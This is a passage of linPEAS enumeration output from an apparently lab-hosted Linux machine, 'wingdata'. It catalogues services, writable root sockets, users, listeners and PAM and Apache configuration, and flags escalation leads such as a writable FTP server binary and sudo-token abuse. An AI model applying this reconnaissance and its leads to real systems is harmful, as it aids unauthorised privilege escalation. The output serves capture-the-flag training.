cron.service                       loaded active running Regular background program processing daemon
dbus.service                       loaded active running D-Bus System Message Bus
getty@tty1.service                 loaded active running Getty on tty1
ifupdown-pre.service               loaded active exited  Helper to synchronize boot up for ifupdown
  Potential issue in service file: /lib/systemd/system/ifupdown-pre.service
  └─ RELATIVE_PATH: Could be executing some relative path
keyboard-setup.service             loaded active exited  Set the console keyboard layout
kmod-static-nodes.service          loaded active exited  Create List of Static Device Nodes
netfilter-persistent.service       loaded active exited  netfilter persistent configuration
networking.service                 loaded active exited  Raise network interfaces
  Potential issue in service file: /lib/systemd/system/networking.service
  └─ RELATIVE_PATH: Could be executing some relative path
ssh.service                        loaded active running OpenBSD Secure Shell server
systemd-binfmt.service             loaded active exited  Set Up Additional Binary Formats
systemd-journal-flush.service      loaded active exited  Flush Journal to Persistent Storage
  Potential issue in service file: /lib/systemd/system/systemd-journal-flush.service
  └─ RELATIVE_PATH: Could be executing some relative path
systemd-journald.service           loaded active running Journal Service
systemd-logind.service             loaded active running User Login Management
systemd-modules-load.service       loaded active exited  Load Kernel Modules
systemd-random-seed.service        loaded active exited  Load/Save Random Seed
systemd-remount-fs.service         loaded active exited  Remount Root and Kernel File Systems
  Potential issue in service: systemd-remount-fs.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands
systemd-sysctl.service             loaded active exited  Apply Kernel Variables
systemd-sysusers.service           loaded active exited  Create System Users
  Potential issue in service file: /lib/systemd/system/systemd-sysusers.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service: systemd-sysusers.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands
systemd-timesyncd.service          loaded active running Network Time Synchronization
systemd-tmpfiles-setup-dev.service loaded active exited  Create Static Device Nodes in /dev
systemd-tmpfiles-setup.service     loaded active exited  Create System Files and Directories
systemd-udev-trigger.service       loaded active exited  Coldplug All udev Devices
  Potential issue in service file: /lib/systemd/system/systemd-udev-trigger.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service: systemd-udev-trigger.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands
systemd-udevd.service              loaded active running Rule-based Manager for Device Events and Files
  Potential issue in service file: /lib/systemd/system/systemd-udevd.service
  └─ RELATIVE_PATH: Could be executing some relative path
systemd-update-utmp.service        loaded active exited  Record System Boot/Shutdown in UTMP
systemd-user-sessions.service      loaded active exited  Permit User Sessions
vmware-tools.service               loaded active running LSB: VMware Tools service
wftpserver.service                 loaded active running Wing FTP Server daemon
LOAD   = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB    = The low-level unit activation state, values depend on unit type.
31 loaded units listed.

══╣ Disabled services: (T1543.002,T1007)
apache-htcacheclean.service            disabled enabled
apache-htcacheclean@.service           disabled enabled
apache2@.service                       disabled enabled
console-getty.service                  disabled disabled
debug-shell.service                    disabled disabled
ifupdown-wait-online.service           disabled enabled
nftables.service                       disabled enabled
serial-getty@.service                  disabled enabled
systemd-boot-check-no-failures.service disabled disabled
systemd-network-generator.service      disabled enabled
systemd-networkd-wait-online.service   disabled disabled
systemd-networkd-wait-online@.service  disabled enabled
systemd-sysext.service                 disabled enabled
  Potential issue in service file: /lib/systemd/system/systemd-sysext.service
  └─ RELATIVE_PATH: Could be executing some relative path
systemd-time-wait-sync.service         disabled disabled
14 unit files listed.

══╣ Additional service files: (T1543.002,T1007)
  Potential issue in service file: /etc/systemd/system/multi-user.target.wants/networking.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service file: /etc/systemd/system/network-online.target.wants/networking.service
  └─ RELATIVE_PATH: Could be executing some relative path
You can't write on systemd PATH

╔══════════╣ Systemd Information (T1543.002)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths
═╣ Systemd version and vulnerabilities? .............. 252.39
═╣ Services running as root? .....
═╣ Running services with dangerous capabilities? ...
═╣ Services with writable paths? . wftpserver.service: /opt/wftpserver/wftpserver (from ExecStart=/opt/wftpserver/wftpserver)

╔══════════╣ Systemd PATH (T1543.002)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Analyzing .socket files (T1559)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets

╔══════════╣ Unix Sockets Analysis (T1571,T1049)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
/run/dbus/system_bus_socket
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
  └─High risk: root-owned and writable Unix socket
/run/systemd/fsck.progress
/run/systemd/inaccessible/sock
/run/systemd/io.system.ManagedOOM
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
  └─High risk: root-owned and writable Unix socket
/run/systemd/journal/dev-log
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
  └─High risk: root-owned and writable Unix socket
/run/systemd/journal/io.systemd.journal
/run/systemd/journal/socket
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
  └─High risk: root-owned and writable Unix socket
/run/systemd/journal/stdout
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
  └─High risk: root-owned and writable Unix socket
/run/systemd/notify
  └─(Read Write Execute (Weak Permissions: 777) )
  └─(Owned by root)
  └─High risk: root-owned and writable Unix socket
/run/systemd/private
/run/systemd/userdb/io.systemd.DynamicUser
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
  └─High risk: root-owned and writable Unix socket
/run/udev/control
/run/vmware/guestServicePipe
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
  └─High risk: root-owned and writable Unix socket
/var/run/vmware/guestServicePipe
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
  └─High risk: root-owned and writable Unix socket

╔══════════╣ D-Bus Analysis (T1559.001)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus
NAME                         PID PROCESS         USER             CONNECTION    UNIT                      SESSION DESCRIPTION
:1.0                        2294 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -       -
:1.1                           1 systemd         root             :1.1          init.scope                -       -
:1.1031                   103823 busctl          wingftp          :1.1031       wftpserver.service        -       -
:1.2                        3188 systemd-logind  root             :1.2          systemd-logind.service    -       -
org.freedesktop.DBus           1 systemd         root             -             init.scope                -       -
org.freedesktop.hostname1      - -               -                (activatable) -                         -       -
org.freedesktop.locale1        - -               -                (activatable) -                         -       -
org.freedesktop.login1      3188 systemd-logind  root             :1.2          systemd-logind.service    -       -
org.freedesktop.network1       - -               -                (activatable) -                         -       -
org.freedesktop.systemd1       1 systemd         root             :1.1          init.scope                -       -
org.freedesktop.timedate1      - -               -                (activatable) -                         -       -
org.freedesktop.timesync1   2294 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -       -

╔══════════╣ D-Bus Configuration Files (T1559.001)

══╣ D-Bus Session Bus Analysis (T1559.001)
(Access to session bus available)

╔══════════╣ Legacy r-commands (rsh/rlogin/rexec) and host-based trust (T1021.004)

══╣ Listening r-services (TCP 512-514) (T1021.004)

══╣ systemd units exposing r-services (T1021.004)
rlogin|rsh|rexec units Not Found

══╣ inetd/xinetd configuration for r-services (T1021.004)
/etc/inetd.conf Not Found
/etc/xinetd.d Not Found

══╣ Installed r-service server packages (T1021.004)
  No related packages found via dpkg

══╣ /etc/hosts.equiv and /etc/shosts.equiv (T1021.004)

══╣ Per-user .rhosts files (T1021.004)
.rhosts Not Found

══╣ PAM rhosts authentication (T1021.004)
/etc/pam.d/rlogin|rsh Not Found

══╣ SSH HostbasedAuthentication (T1021.004)
  HostbasedAuthentication no or not set

══╣ Potential DNS control indicators (local) (T1021.004)
  Not detected

╔══════════╣ Crontab UI (root) misconfiguration checks (T1053.003)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
crontab-ui Not Found
╔══════════╣ Deleted files still open (T1083)
╚ Open deleted files can hide tools and still consume disk space

                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Interfaces (T1016)
default         0.0.0.0
loopback        127.0.0.0
link-local      169.254.0.0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.232.33  netmask 255.255.0.0  broadcast 10.129.255.255
        ether 00:50:56:95:97:51  txqueuelen 1000  (Ethernet)
        RX packets 7537  bytes 7479287 (7.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4832  bytes 924776 (903.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 124  bytes 27340 (26.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 124  bytes 27340 (26.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

══╣ Routing & policy quick view (T1016)
default via 10.129.0.1 dev eth0
10.129.0.0/16 dev eth0 proto kernel scope link src 10.129.232.33

0:      from all lookup local
32766:  from all lookup main
32767:  from all lookup default
══╣ Virtual/overlay interfaces quick view (T1016)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP mode DEFAULT group default qlen 1000
══╣ Network namespaces quick view (T1016)
══╣ Forwarding status (T1016)
net.ipv4.ip_forward = 0
net.ipv6.conf.all.forwarding = 0

╔══════════╣ Hostname, hosts and DNS (T1016,T1018)
══╣ Hostname Information (T1016,T1018)
System hostname: wingdata
FQDN: wingdata

══╣ Hosts File Information (T1016,T1018)
Contents of /etc/hosts:
  127.0.0.1     localhost
  127.0.1.1     wingdata
  ::1     localhost ip6-localhost ip6-loopback
  ff02::1 ip6-allnodes
  ff02::2 ip6-allrouters

══╣ DNS Configuration (T1016,T1018)
DNS Servers (resolv.conf):
  1.1.1.1
  8.8.8.8
-e
DNS Domain Information:
(none)

╔══════════╣ Active Ports (T1049)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active Ports (netstat) (T1049)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      3558/wftpserver
tcp        0      0 0.0.0.0:38167           0.0.0.0:*               LISTEN      3558/wftpserver
tcp        0      0 0.0.0.0:5466            0.0.0.0:*               LISTEN      3558/wftpserver
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::5466                 :::*                    LISTEN      3558/wftpserver
══╣ Local-only listeners (loopback) (T1049)
tcp   LISTEN 0      128        127.0.0.1:8080       0.0.0.0:*    users:(("sed",pid=104067,fd=11),("grep",pid=104066,fd=11),("ss",pid=104065,fd=11),("linpeas.sh",pid=74193,fd=11),("dd",pid=74101,fd=11),("bash",pid=74098,fd=11),("grep",pid=74092,fd=11),("bash",pid=74090,fd=11),("bash",pid=74087,fd=11),("dd",pid=31332,fd=11),("bash",pid=31329,fd=11),("grep",pid=31323,fd=11),("bash",pid=31322,fd=11),("bash",pid=31321,fd=11),("bash",pid=3677,fd=11),("python3",pid=3676,fd=11),("sh",pid=3675,fd=11),("sh",pid=3674,fd=11),("sh",pid=3673,fd=11),("wftpserver",pid=3558,fd=11))
══╣ Unique listener bind addresses (T1049)
::
0.0.0.0
127.0.0.1
══╣ Potential local forwarders/relays (T1049)
wingftp   104074  0.0  0.0   6420  1020 pts/0    S+   05:13   0:00 sed -E s,socat|ssh|-L|-R|-D|ncat|nc,?[1;31;103m&?[0m,g

╔══════════╣ Network Traffic Analysis Capabilities (T1040)

══╣ Available Sniffing Tools (T1040)
No sniffing tools found

══╣ Network Interfaces Sniffing Capabilities (T1040)
Interface lo (loopback): Not sniffable
Interface eth0: Not sniffable
No sniffable interfaces found

══╣ Running sniffing/traffic reconstruction processes (T1040)

╔══════════╣ Firewall Rules Analysis (T1016)

══╣ Iptables Rules (T1016)
No permission to list iptables rules

══╣ Nftables Rules (T1016)
No permission to list nftables rules

══╣ Firewalld Rules (T1016)
firewalld Not Found

══╣ UFW Rules (T1016)
ufw Not Found

══╣ Forwarding and rp_filter (T1016)
net.ipv4.ip_forward = 0
net.ipv6.conf.all.forwarding = 0
net.ipv4.conf.all.rp_filter = 0

╔══════════╣ Inetd/Xinetd Services Analysis (T1049)

══╣ Inetd Services (T1049)
inetd Not Found

══╣ Xinetd Services (T1049)
xinetd Not Found

══╣ Running Inetd/Xinetd Services (T1049)
Active Services (from netstat):
-e
Active Services (from ss):
-e
Running Service Processes:

╔══════════╣ Internet Access? (T1016,T1590)
Port 80 is not accessible
DNS is not accessible
Port 443 is not accessible
ICMP is not accessible
Port 443 is not accessible with curl

══╣ Proxy discovery (T1016,T1590)
╚ Checking common proxy env vars and apt proxy config

                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user (T1033)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)

╔══════════╣ PGP Keys and Related Files (T1552.004)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#pgp-keys
GPG:
GPG is installed, listing keys:
-e
NetPGP:
netpgpkeys Not Found
-e
PGP Related Files:

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d (T1548.003)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
[sudo] password for wingftp: ICMP is not accessible

Sorry, try again.
[sudo] password for wingftp:
Sorry, try again.
[sudo] password for wingftp:

╔══════════╣ Checking sudo tokens (T1548.003)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens
ptrace protection is disabled (0), so sudo tokens could be abused
Sudo token directory perms:
drwx------ 2 root root 60 May  8 04:59 /var/run/sudo/ts

doas.conf Not Found

╔══════════╣ Checking Pkexec and Polkit (T1548.003,T1548.004,T1068)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2

══╣ Polkit Binary (T1548.003,T1068)

══╣ Polkit Policies (T1548.003)
Checking /usr/share/polkit-1/rules.d/:
// This file is part of systemd.
// See systemd-networkd.service(8) and polkit(8) for more information.

// Allow systemd-networkd to set timezone, get product UUID,
// and transient hostname
polkit.addRule(function(action, subject) {
    if ((action.id == "org.freedesktop.hostname1.set-hostname" ||
         action.id == "org.freedesktop.hostname1.get-product-uuid" ||
         action.id == "org.freedesktop.timedate1.set-timezone") &&
        subject.user == "systemd-network") {
        return polkit.Result.YES;
    }
});

══╣ Polkit Authentication Agent (T1548.004)

╔══════════╣ Superusers and UID 0 Users (T1087.001)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html

══╣ Users with UID 0 in /etc/passwd (T1087.001)
root:x:0:0:root:/root:/bin/bash

══╣ Users with sudo privileges in sudoers (T1087.001)

╔══════════╣ Users with console (T1087.001)
root:x:0:0:root:/root:/bin/bash
wacky:x:1001:1001::/home/wacky:/bin/bash
wingftp:x:1000:1000:WingFTP Daemon User,,,:/opt/wingftp:/bin/bash

╔══════════╣ All users & groups (T1087.001,T1069.001)
uid=0(root) gid=0(root) groups=0(root)
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
uid=1001(wacky) gid=1001(wacky) groups=1001(wacky)
uid=100(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=101(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=42(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=997(systemd-timesync) gid=997(systemd-timesync) groups=997(systemd-timesync)
uid=998(systemd-network) gid=998(systemd-network) groups=998(systemd-network)
uid=999(_laurel) gid=996(_laurel) groups=996(_laurel)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Currently Logged in Users (T1033)

══╣ Basic user information (T1033)
 05:16:38 up 31 min,  0 user,  load average: 0.32, 0.32, 0.21
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

══╣ Active sessions (T1033)
 05:16:38 up 31 min,  0 user,  load average: 0.32, 0.32, 0.21
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

══╣ Logged in users (utmp) (T1033)
           system boot  2026-05-08 04:45
           run-level 5  2026-05-08 04:45
LOGIN      tty1         2026-05-08 04:45              3531 id=tty1

══╣ SSH sessions (T1033)

══╣ Screen sessions (T1033)

══╣ Tmux sessions (T1033)

╔══════════╣ Last Logons and Login History (T1033)

══╣ Last logins (T1033)
reboot   system boot  6.1.0-42-amd64   Fri May  8 04:45   still running
wacky    pts/0        10.10.14.5       Mon Feb  9 09:36 - 09:38  (00:02)
reboot   system boot  6.1.0-42-amd64   Mon Feb  9 09:35 - 09:38  (00:03)
wacky    pts/0        10.10.14.5       Mon Feb  9 04:59 - 05:15  (00:16)
reboot   system boot  6.1.0-42-amd64   Mon Feb  9 04:57 - 05:15  (00:18)
wacky    pts/0        10.10.14.64      Thu Jan 22 05:17 - 05:17  (00:00)
reboot   system boot  6.1.0-42-amd64   Thu Jan 22 05:16 - 05:18  (00:01)
wacky    pts/0        10.10.14.64      Thu Jan 22 05:08 - 05:16  (00:07)
reboot   system boot  6.1.0-42-amd64   Thu Jan 22 05:07 - 05:16  (00:08)

wtmp begins Thu Jan 22 05:07:17 2026

══╣ Failed login attempts (T1033)

══╣ Recent logins from auth.log (limit 20) (T1033)

══╣ Last time logon each user (T1033)
Username         Port     From                                       Latest
wacky            pts/0    10.10.14.5                                Mon Feb  9 09:36:36 -0500 2026

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!

                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software (T1082)
/usr/bin/base64
/usr/bin/curl
/usr/bin/g++
/usr/bin/gcc
/usr/bin/make
/usr/bin/nc
/usr/bin/nc.traditional
/usr/bin/netcat
/usr/bin/perl
/usr/bin/ping
/usr/local/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers (T1587.001)
ii  g++                             4:12.2.0-3                     amd64        GNU C++ compiler
ii  g++-12                          12.2.0-14+deb12u1              amd64        GNU C++ compiler
ii  gcc                             4:12.2.0-3                     amd64        GNU C compiler
ii  gcc-12                          12.2.0-14+deb12u1              amd64        GNU C compiler
ii  rpcsvc-proto                    1.4.3-1                        amd64        RPC protocol compiler and definitions
/usr/bin/gcc

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.66 (Debian)
Server built:   2025-12-05T18:54:44
httpd Not Found

Nginx version: nginx Not Found

══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Feb  9 08:19 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Feb  9 08:19 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 36 Nov  2  2025 /etc/apache2/sites-enabled/wingdata.htb.conf -> ../sites-available/wingdata.htb.conf
<VirtualHost *:80>
    ServerName localhost
    Redirect permanent / http://wingdata.htb/
</VirtualHost>
<VirtualHost *:80>
    ServerName wingdata.htb
    DocumentRoot /var/www/wingdata.htb
    <Directory /var/www/wingdata.htb>
        Options -Indexes +FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>
    ErrorLog ${APACHE_LOG_DIR}/wingdata_error.log
    CustomLog ${APACHE_LOG_DIR}/wingdata_access.log combined
</VirtualHost>
<VirtualHost *:80>
    ServerName ftp.wingdata.htb
    ProxyPreserveHost On
    ProxyPass / http://127.0.0.1:8080/
    ProxyPassReverse / http://127.0.0.1:8080/
    <Location "/">
        Require all granted
    </Location>
    ErrorLog ${APACHE_LOG_DIR}/ftp.wingdata_proxy_error.log
    CustomLog ${APACHE_LOG_DIR}/ftp.wingdata_proxy_access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Nov  2  2025 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf

lrwxrwxrwx 1 root root 35 Nov  2  2025 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf

╔══════════╣ Browser Profiles (T1539,T1217)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#browser-data

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb  9 08:19 /etc/pam.d
-rw-r--r-- 1 root root 2133 Jul 28  2025 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open

drwxr-xr-x 2 root root 4096 Feb  9 08:19 /etc/pam.d
-rw-r--r-- 1 root root 384 Apr  7  2025 /etc/pam.d/chfn
auth            sufficient      pam_rootok.so
-rw-r--r-- 1 root root 1154 Jan 22 04:40 /etc/pam.d/common-session-noninteractive
session [default=1]                     pam_permit.so
session required                        pam_permit.so
-rw-r--r-- 1 root root 92 Apr  7  2025 /etc/pam.d/passwd
-rw-r--r-- 1 root root 185 Jun 24  2025 /etc/pam.d/sudo
-rw-r--r-- 1 root root 4126 Apr  7  2025 /etc/pam.d/login
-rw-r--r-- 1 root root 2259 Nov 21  2024 /etc/pam.d/su
auth       sufficient pam_rootok.so
-rw-r--r-- 1 root root 143 Nov 21  2024 /etc/pam.d/runuser
auth            sufficient      pam_rootok.so
-rw-r--r-- 1 root root 606 Jul 17  2022 /etc/pam.d/cron
-rw-r--r-- 1 root root 1208 Jan 22 04:40 /etc/pam.d/common-account
account required                        pam_permit.so
-rw-r--r-- 1 root root 138 Nov 21  2024 /etc/pam.d/runuser-l
-rw-r--r-- 1 root root 278 Jan  8 09:28 /etc/pam.d/vmtoolsd
auth       sufficient       pam_unix.so shadow
account    sufficient       pam_unix.so
-rw-r--r-- 1 root root 581 Apr  7  2025 /etc/pam.d/chsh
auth            sufficient      pam_rootok.so
-rw-r--r-- 1 root root 1146 Jan 22 04:40 /etc/pam.d/common-session
session [default=1]                     pam_permit.so
session required                        pam_permit.so
-rw-r--r-- 1 root root 137 Nov 21  2024 /etc/pam.d/su-l
-rw-r--r-- 1 root root 1214 Jan 22 04:40 /etc/pam.d/common-auth
auth    [success=1 default=ignore]      pam_unix.so nullok
auth    required                        pam_permit.so
-rw-r--r-- 1 root root 1620 Jan 22 04:40 /etc/pam.d/common-password
password        required                        pam_permit.so
-rw-r--r-- 1 root root 170 Jun 24  2025 /etc/pam.d/sudo-i
-rw-r--r-- 1 root root 92 Apr  7  2025 /etc/pam.d/chpasswd
-rw-r--r-- 1 root root 2133 Jul 28  2025 /etc/pam.d/sshd
-rw-r--r-- 1 root root 92 Apr  7  2025 /etc/pam.d/newusers
-rw-r--r-- 1 root root 520 Sep 21  2023 /etc/pam.d/other

╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Feb  9 08:19 /etc/ldap

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb  9 08:19 /etc/apt/keyrings
drwxr-xr-x 2 root root 4096 Feb  9 08:19 /usr/share/keyrings

╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 761 Apr  3  2022 /usr/share/bash-completion/completions/postfix

╔══════════╣ Analyzing Http conf Files (limit 70)
lrwxrwxrwx 1 root root 15 Dec  5 13:54 /usr/share/doc/apache2/examples/apache2/original/httpd.conf -> ../apache2.conf

╔══════════╣ Analyzing Proxy Config Files (limit 70)
-rw-r--r-- 1 root root 0 Nov  2  2025 /etc/environment

╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 826 Apr  3  2022 /usr/share/bash-completion/completions/bind
-rw-r--r-- 1 root root 826 Apr  3  2022 /usr/share/bash-completion/completions/bind

╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3526 Jun  6  2025 /etc/skel/.bashrc

-rw-r--r-- 1 root root 807 Jun  6  2025 /etc/skel/.profile

╔══════════╣ Searching mysql credentials and exec (T1552.001)

MySQL process not found.
╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
gpg Not Found
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 11861 Apr  9  2025 /etc/apt/trusted.gpg.d/debian-archive-bookworm-automatic.asc
-----BEGIN PGP PUBLIC KEY BLOCK-----
mQINBGPL0BUBEADmW5NdOOHwPIJlgPu6JDcKw/NZJPR8lsD3K87ZM18gzyQZJD+w
ns6TSXOsx+BmpouHZgvh3FQADj/hhLjpNSqH5IH0xY7nic9BuSeyKx2WvfG62yxw
XcFkwTxoWpF3tg0cv+kT4VA3MfVj5GebuS4F9Jv01WuGkxUllzdzeAoC70IYNOKV
+Av7hX5cOaCAgvDCQmhVnQ6Nz4fXdPdMHVodlPsKbv8ymVsfvb8UzQ6dl9w1gIu9
4S0FCQeEePSii23jHISYwku/f6huQGxSjAy8yxab0aZshl98c3pGGfOJHntmHwOG
gqV+Gm1hbcBjc6X8ybL2KEr/Lu4xAK3xSQmP+tO6MNxfBTCeo8fXRT95pqj7t3QH
Iu+LbVYrkLQ6St9mdOgUUsAdVYXJ3eh8Y+CfjmBywNRizOGHrEp8JsAcS0+a9yBL
+BYWhS4BL/EeeacRLT9kfzIqS1OD/RL/4Qbi2GLGFsiHaKFUn4xse20ZXq5XtEL6
ltQVIr/iAlBtdSOnge/ZkNvd3SQIyC2QBNAy67QutS8yiaCE2vtr8i5GQOu2fgr1
NJ0VjuwshmgJvbZ2m/9Zq1Yp1iMnPVJtOWcNxTZAWJDN4L5OdoqbaOkqS/+cgLy2
UTsc0A7cxt/2ugOtln/utXsfgb3Qno69yCuSbQmVM1NrwvZVxPIWi7B2gQARAQAB
iQJOBB8BCgA4FiEEuLgLW2I+q2rYd1xFt8XX1jUJR/gFAmPL0BcXDIABgOl28UpQ
ikjpyj/pvDciUsoc+WQCBwAACgkQt8XX1jUJR/jTMRAAt6Mltzz7xk7RGIGaF+ug
0QSoh9n07Y0oxEAb1cPSvo3o5wnxQ6ZYIukr2KTFkXaDh35XpXoA2Z9Uf6wz4h8B
nF8DWhbo+2sSq9au0J16bsLuIHfhzJWXSwyekHOrLiiiSfhjey9eQzgOT8jJsEjy
FzfxtMOTepXX8yQdp4SK3WYdVjAcbwjFGcbh5VqQIsr1+MdlaVchqWP1vm1ADvQF
C87hQjhpMzQoU7WVkJWsqlMuXh95h59h/SndBiHKXHQfs/LAM7M2K/fgS9+EbPWW
fC97/8SqpXheDsvCvueumTyzUCNXFpNGwUUA1qO6GTaMwHjaX/AeCaRMxCQcLdQ0
7b6zc13dqiMAAL1eSQ10TFP9kD2QoyPjF6lh0S5xshHWET5duw71KjYAAOGdv8J3
9DGMvT8OdL8UklIJy7KLjxJOjY21oPCHgx1cQKLONCgOAcQ4ZmzBOP8sWZ7ld8OV
Ke4c/bOqwbRMLNXUwuVJuejwvoypCOxbdlYUnfL633wVMQBM8ilog+2TydStV4AU
CQVsICw4iaXUU+B6gh1euvgvCW13q7pMFJDPbpC+EFC1Fl4RT+CFLE8XG0kXHQ3x
HWo+/b49x3MYv5wS33+NZpfdHEuHKwybfTIVshlPU8rXmrwmVXO9iRmAczjcoeYZ
OTI5EJz20PBi65wAdpAFVBeJAk4EHwEKADgWIQS4uAtbYj6rath3XEW3xdfWNQlH
+AUCY8vQFxcMgAH7+r21QbXclVvZum7bFs9bsSUlxAIHAAAKCRC3xdfWNQlH+KbZ
D/4uoBtdR5LdZGh5sDBjhcDJ+09vhagDh4/lLsiH5/HEmY5M0fwUTvnzV00Bsu3y
